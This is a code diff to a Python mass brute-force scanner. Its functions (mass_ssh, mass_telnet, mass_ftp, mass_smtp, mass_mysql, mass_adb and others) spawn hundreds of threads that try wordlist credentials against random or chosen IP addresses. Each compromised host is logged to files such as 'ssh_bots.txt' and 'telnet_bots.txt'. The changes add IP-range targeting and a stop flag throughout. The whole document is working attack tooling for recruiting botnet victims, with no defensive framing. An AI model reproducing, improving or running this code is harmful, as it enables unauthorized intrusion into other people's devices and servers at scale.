@@ -44,8 +44,12 @@ def getip():
 '''
 class iots(threading.Thread):
  def run(self):
-  while True:
-   ip=getip()
+  self.ip_seg=ip_seg
+  while (stop!=True):
+   if self.ip_seg==None:
+     ip=getip()
+   else:
+     ip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
    i=False
    try:
     so=socket.socket()
@@ -71,12 +75,16 @@ class iots(threading.Thread):
        write_file(ip,filen)
      except Exception as e: 
       pass
-def mass_ssh(threads=100,wl=wordlist,filename='ssh_bots.txt'):
+def mass_ssh(threads=100,word_list=wordlist,filename='ssh_bots.txt',ip_range=None):
+ global stop
+ stop=False
+ global ip_seg
+ ip_seg=ip_range
  create_file(filename)
  global filen
  filen=filename
  global wordlist
- wordlist=wl
+ wordlist=word_list
  thr=[]
  for x in range(threads):
   try:
@@ -84,17 +92,22 @@ def mass_ssh(threads=100,wl=wordlist,filename='ssh_bots.txt'):
    thr.append(t)
   except:
    pass
- while True:
+ while (stop!=True):
   try:
     time.sleep(.1)
   except KeyboardInterrupt:
+    stop=True
     break
  for x in thr:
      del x
 class iott(threading.Thread):
  def run(self):
-  while True:
-   ip=getip()
+  self.ip_seg=ip_seg
+  while (stop!=True):
+   if self.ip_seg==None:
+     ip=getip()
+   else:
+     ip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
    i=False
    try:
     so=socket.socket()
@@ -115,12 +128,16 @@ class iott(threading.Thread):
        write_file(ip,filen)
      except Exception as e: 
       pass
-def mass_telnet(threads=500,wl=wordlist,filename='telnet_bots.txt'):
+def mass_telnet(threads=500,word_list=wordlist,filename='telnet_bots.txt',ip_range=None):
+ global stop
+ stop=False
+ global ip_seg
+ ip_seg=ip_range
  create_file(filename)
  global filen
  filen=filename
  global wordlist
- wordlist=wl
+ wordlist=word_list
  thr=[]
  for x in range(threads):
   try:
@@ -128,17 +145,22 @@ def mass_telnet(threads=500,wl=wordlist,filename='telnet_bots.txt'):
    thr.append(t)
   except:
    pass
- while True:
+ while (stop!=True):
   try:
     time.sleep(.1)
   except KeyboardInterrupt:
+    stop=True
     break
  for x in thr:
      del x
 class iotf1(threading.Thread):
  def run(self):
-  while True:
-   ip=getip()
+  self.ip_seg=ip_seg
+  while (stop!=True):
+   if self.ip_seg==None:
+     ip=getip()
+   else:
+     ip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
    i=False
    try:
     so=socket.socket()
@@ -158,12 +180,16 @@ class iotf1(threading.Thread):
        write_file(ip,filen)
      except Exception as e: 
       pass
-def mass_ftp(threads=100,meth=1,wl=wordlist,filename='ftp_bots.txt'):
+def mass_ftp(threads=100,meth=1,word_list=wordlist,filename='ftp_bots.txt',ip_range=None):
+ global ip_seg
+ ip_seg=ip_range
+ global stop
+ stop=False
  create_file(filename)
  global filen
  filen=filename
  global wordlist
- wordlist=wl
+ wordlist=word_list
  thr=[]
  for x in range(threads):
   try:
@@ -171,17 +197,22 @@ def mass_ftp(threads=100,meth=1,wl=wordlist,filename='ftp_bots.txt'):
    thr.append(t)
   except:
    pass
- while True:
+ while (stop!=True):
   try:
     time.sleep(.1)
   except KeyboardInterrupt:
+    stop=True
     break
  for x in thr:
      del x
 class iotf2(threading.Thread):
  def run(self):
-  while True:
-   ip=getip()
+  self.ip_seg=ip_seg
+  while (stop!=True):
+   if self.ip_seg==None:
+     ip=getip()
+   else:
+     ip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
    i=False
    try:
     so=socket.socket()
@@ -197,7 +228,11 @@ class iotf2(threading.Thread):
        write_file(ip,filen)
      except Exception as e: 
       pass
-def mass_ftp_anon(threads=100,filename='ftp_anon_bots.txt'):
+def mass_ftp_anon(threads=100,filename='ftp_anon_bots.txt',ip_range=None):
+ global ip_seg
+ ip_seg=ip_range
+ global stop
+ stop=False
  create_file(filename)
  global filen
  filen=filename
@@ -208,18 +243,22 @@ def mass_ftp_anon(threads=100,filename='ftp_anon_bots.txt'):
    thr.append(t)
   except:
    pass
- while True:
+ while (stop!=True):
   try:
     time.sleep(.1)
   except KeyboardInterrupt:
+    stop=True
     break
  for x in thr:
      del x
 class iotsm(threading.Thread):
  def run(self):
-  while True:
-   ip=getip()
-   i=False
+  self.ip_seg=ip_seg
+  while (stop!=True):
+   if self.ip_seg==None:
+     ip=getip()
+   else:
+     ip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
    try:
     so=socket.socket()
     so.settimeout(3)
@@ -238,14 +277,18 @@ class iotsm(threading.Thread):
        write_file(ip,filen)
      except Exception as e: 
       pass
-def mass_smtp(o,threads=100,wl=wordlist,filename='smtp_bots.txt'):
+def mass_smtp(o,threads=100,word_list=wordlist,filename='smtp_bots.txt',ip_range=None):
+ global ip_seg
+ ip_seg=ip_range
+ global stop
+ stop=False
  create_file(filename)
  global filen
  filen=filename
  global octet
  octet=o
  global wordlist
- wordlist=wl
+ wordlist=word_list
  thr=[]
  for x in range(threads):
   try:
@@ -253,17 +296,22 @@ def mass_smtp(o,threads=100,wl=wordlist,filename='smtp_bots.txt'):
    thr.append(t)
   except:
    pass
- while True:
+ while (stop!=True):
   try:
     time.sleep(.1)
   except KeyboardInterrupt:
+    stop=True
     break
  for x in thr:
      del x
 class iotmy(threading.Thread):
  def run(self):
-  while True:
-   ip=getip()
+  self.ip_seg=ip_seg
+  while (stop!=True):
+   if self.ip_seg==None:
+     ip=getip()
+   else:
+     ip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
    i=False
    try:
     so=socket.socket()
@@ -283,12 +331,16 @@ class iotmy(threading.Thread):
        write_file(ip,filen)
      except Exception as e: 
       pass
-def mass_mysql(threads=100,wl=wordlist,filename='mysql_bots.txt'):
+def mass_mysql(threads=100,word_list=wordlist,filename='mysql_bots.txt',ip_range=None):
+ global ip_seg
+ ip_seg=ip_range
+ global stop
+ stop=False
  create_file(filename)
  global filen
  filen=filename
  global wordlist
- wordlist=wl
+ wordlist=word_list
  thr=[]
  for x in range(threads):
   try:
@@ -296,18 +348,23 @@ def mass_mysql(threads=100,wl=wordlist,filename='mysql_bots.txt'):
    thr.append(t)
   except:
    pass
- while True:
+ while (stop!=True):
   try:
     time.sleep(.1)
   except KeyboardInterrupt:
+    stop=True
     break
  for x in thr:
      del x
 class iotmy2(threading.Thread):
  def run(self):
   s=mysql
-  while True:
-   ip=getip()
+  self.ip_seg=ip_seg
+  while (stop!=True):
+   if self.ip_seg==None:
+     ip=getip()
+   else:
+     ip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
    i=False
    try:
     so=socket.socket()
@@ -324,12 +381,16 @@ class iotmy2(threading.Thread):
        write_file(ip,filen)
      except Exception as e: 
       pass
-def mass_mysql_default(threads=100,wl=wordlist,filename='mysql_default_bots.txt'):
+def mass_mysql_default(threads=100,word_list=wordlist,filename='mysql_default_bots.txt',ip_range=None):
+ global ip_seg
+ ip_seg=ip_range
+ global stop
+ stop=False
  create_file(filename)
  global filen
  filen=filename
  global wordlist
- wordlist=wl
+ wordlist=word_list
  thr=[]
  for x in range(threads):
   try:
@@ -337,17 +398,22 @@ def mass_mysql_default(threads=100,wl=wordlist,filename='mysql_default_bots.txt'
    thr.append(t)
   except:
    pass
- while True:
+ while (stop!=True):
   try:
     time.sleep(.1)
   except KeyboardInterrupt:
+    stop=True
     break
  for x in thr:
      del x
 class iotadb(threading.Thread):
  def run(self):
-  while True:
-   ip=getip()
+  self.ip_seg=ip_seg
+  while (stop!=True):
+   if self.ip_seg==None:
+     ip=getip()
+   else:
+     ip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
    i=False
    try:
     so=socket.socket()
@@ -364,12 +430,16 @@ class iotadb(threading.Thread):
        write_file(ip,filen)
      except Exception as e: 
       pass
-def mass_adb(threads=100,wl=wordlist,filename='adb_bots.txt'):
+def mass_adb(threads=100,word_list=wordlist,filename='adb_bots.txt',ip_range=None):
+ global ip_seg
+ ip_seg=ip_range
+ global stop
+ stop=False
  create_file(filename)
  global filen
  filen=filename
  global wordlist
- wordlist=wl
+ wordlist=word_list
  thr=[]
  for x in range(threads):
   try:
@@ -377,10 +447,11 @@ def mass_adb(threads=100,wl=wordlist,filename='adb_bots.txt'):
    thr.append(t)
   except:
    pass
- while True:
+ while (stop!=True):
   try:
     time.sleep(.1)
   except KeyboardInterrupt:
+    stop=True
     break
  for x in thr:
      del x
